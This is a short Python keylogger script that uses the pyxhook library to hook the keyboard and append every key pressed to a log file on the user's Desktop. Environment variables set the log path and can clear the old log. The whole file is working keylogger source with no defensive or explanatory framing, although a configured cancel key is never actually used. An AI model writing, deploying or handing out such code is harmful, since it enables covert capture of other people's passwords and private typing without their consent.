import os
import pyxhook  # type: ignore

log_file = os.getenv('pylogger_file', os.path.expanduser('~/Desktop/file.log'))

cancel_key = ord(os.getenv('pylogger_cancel', '`')[0])

if os.getenv('pylogger_clean'):
    try:
        os.remove(log_file)

    except FileNotFoundError:
        pass
 
def on_key_press(event):

 with open(log_file, 'a') as f:
    f.write(f'{event.Key}\n')
 
 
hook_manager = pyxhook.HookManager()

hook_manager.KeyDown = on_key_press

hook_manager.HookKeyboard()

try:

 hook_manager.start()

except KeyboardInterrupt:

    pass
  
except Exception as ex:

 with open(log_file, 'a') as f:

    f.write(f'Error: {ex}\n')
